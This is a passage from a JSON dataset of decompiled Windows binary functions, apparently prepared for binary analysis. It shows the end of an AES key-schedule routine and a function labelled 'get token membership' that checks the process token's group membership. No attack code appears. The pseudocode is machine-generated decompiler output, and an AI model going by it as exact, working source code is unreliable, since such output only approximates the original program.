0x20);\n    uVar3 = SUB164(auVar2 >> 0x60, 0);\n    auVar2 = CONCAT88(SUB168(auVar1 >> 0x40, 0) << 0x20 | SUB168(auVar1, 0) >> 0x20, SUB168(auVar1, 0) << 0x20) ^ auVar1\n    ;\n    param_1[5] = auVar1;\n    auVar2 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n    ;\n    auVar1 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n             ^ CONCAT412(uVar3, CONCAT48(uVar3, CONCAT44(uVar3, uVar3)));\n    param_1[6] = auVar1;\n    auVar2 = aeskeygenassist(auVar1, 0x40);\n    uVar3 = SUB164(auVar2 >> 0x60, 0);\n    auVar1 = CONCAT88(SUB168(auVar1 >> 0x40, 0) << 0x20 | SUB168(auVar1, 0) >> 0x20, SUB168(auVar1, 0) << 0x20) ^ auVar1\n    ;\n    auVar1 = CONCAT88(SUB168(auVar1 >> 0x40, 0) << 0x20 | SUB168(auVar1, 0) >> 0x20, SUB168(auVar1, 0) << 0x20) ^ auVar1\n    ;\n    auVar1 = CONCAT88(SUB168(auVar1 >> 0x40, 0) << 0x20 | SUB168(auVar1, 0) >> 0x20, SUB168(auVar1, 0) << 0x20) ^ auVar1\n             ^ CONCAT412(uVar3, CONCAT48(uVar3, CONCAT44(uVar3, uVar3)));\n    auVar2 = aeskeygenassist(auVar1, 0x80);\n    uVar3 = SUB164(auVar2 >> 0x60, 0);\n    auVar2 = CONCAT88(SUB168(auVar1 >> 0x40, 0) << 0x20 | SUB168(auVar1, 0) >> 0x20, SUB168(auVar1, 0) << 0x20) ^ auVar1\n    ;\n    param_1[7] = auVar1;\n    auVar2 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n    ;\n    auVar1 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n             ^ CONCAT412(uVar3, CONCAT48(uVar3, CONCAT44(uVar3, uVar3)));\n    auVar2 = aeskeygenassist(auVar1, 0x1b);\n    uVar3 = SUB164(auVar2 >> 0x60, 0);\n    auVar2 = CONCAT88(SUB168(auVar1 >> 0x40, 0) << 0x20 | SUB168(auVar1, 0) >> 0x20, SUB168(auVar1, 0) << 0x20) ^ auVar1\n    ;\n    param_1[8] = auVar1;\n    auVar2 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n    ;\n    auVar1 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n             ^ CONCAT412(uVar3, CONCAT48(uVar3, CONCAT44(uVar3, uVar3)));\n    auVar2 = aeskeygenassist(auVar1, 0x36);\n    uVar3 = SUB164(auVar2 >> 0x60, 0);\n    auVar2 = CONCAT88(SUB168(auVar1 >> 0x40, 0) << 0x20 | SUB168(auVar1, 0) >> 0x20, SUB168(auVar1, 0) << 0x20) ^ auVar1\n    ;\n    param_1[9] = auVar1;\n    auVar2 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n    ;\n    param_1[10] = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^\n                  auVar2 ^ CONCAT412(uVar3, CONCAT48(uVar3, CONCAT44(uVar3, uVar3)));\n    auVar2 = aesimc(param_1[9]);\n    param_1[0xb] = auVar2;\n    auVar2 = aesimc(param_1[8]);\n    param_1[0xc] = auVar2;\n    auVar2 = aesimc(param_1[7]);\n    param_1[0xd] = auVar2;\n    auVar2 = aesimc(param_1[6]);\n    param_1[0xe] = auVar2;\n    auVar2 = aesimc(param_1[5]);\n    param_1[0xf] = auVar2;\n    auVar2 = aesimc(param_1[4]);\n    param_1[0x10] = auVar2;\n    auVar2 = aesimc(param_1[3]);\n    param_1[0x11] = auVar2;\n    auVar2 = aesimc(param_1[2]);\n    param_1[0x12] = auVar2;\n    auVar2 = aesimc(param_1[1]);\n    param_1[0x13] = auVar2;\n    return;\n}\n",
        "token_count": 3537
    },
    "0040ce50": {
        "rules": [
            "get token membership"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040ce50(uint *param_1)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t in_FS_OFFSET;\n    uint SidToCheck;\n    int32_t TokenHandle;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t IsMember;\n    \n    var_ch = 0;\n    TokenHandle = 0;\n    uVar4 = 0;\n    IsMember = 0;\n    var_8h = 0;\n    *param_1 = 0;\n    iVar3 = (*_sym.imp.ntdll.dll_NtOpenProcessToken)(0xffffffff, 8, &var_ch);\n    if (iVar3 == 0) {\n        var_8h = 0x44;\n        iVar3 = (*_sym.imp.ADVAPI32.dll_CreateWellKnownSid)(0x1a, 0, &SidToCheck, &var_8h);\n        if ((iVar3 != 0) &&\n           (iVar3 = (*_sym.imp.ADVAPI32.dll_CheckTokenMembership)(0, &SidToCheck, &IsMember),  iVar3 != 0)) {\n            if (IsMember == 0) {\n                iVar3 = (*_sym.imp.ntdll.dll_NtQueryInformationToken)(var_ch, 0x13, &TokenHandle, 4, &var_8h);\n                if (iVar3 != 0) {\n                    uVar1 = *(in_FS_OFFSET + 0x34);\n                    if (((uVar1 != 0x520) && (uVar1 != 0x522)) && (uVar4 = uVar1,  0 < uVar1)) {\n                        uVar4 = uVar1 & 0xffff | 0x80070000;\n                    }\n                    goto code_r0x0040cf43;\n                }\n                iVar3 = (*_sym.imp.ADVAPI32.dll_CheckTokenMembership)(TokenHandle, &SidToCheck, &IsMember);\n                if (iVar3 == 0) goto code_r0x0040ce8c;\n                if (IsMember == 0) goto code_r0x0040cf43;\n            }\n            *param_1 = 1;\n            goto code_r0x0040cf43;\n        }\n    }\ncode_r0x0040ce8c:\n    uVar4 = *(in_FS_OFFSET + 0x34);\n    if (0 < uVar4) {\n        uVar4 = uVar4 & 0xffff | 0x80070000;\n    }\ncode_r0x0040cf43:\n    pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n    if (var_ch != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(var_ch);\n    }\n    if (TokenHandle != 0) {\n        (*pcVar2)(TokenHandle);\n    }\n    return uVar4;\n}\n",
        "token_count": 652
    }
}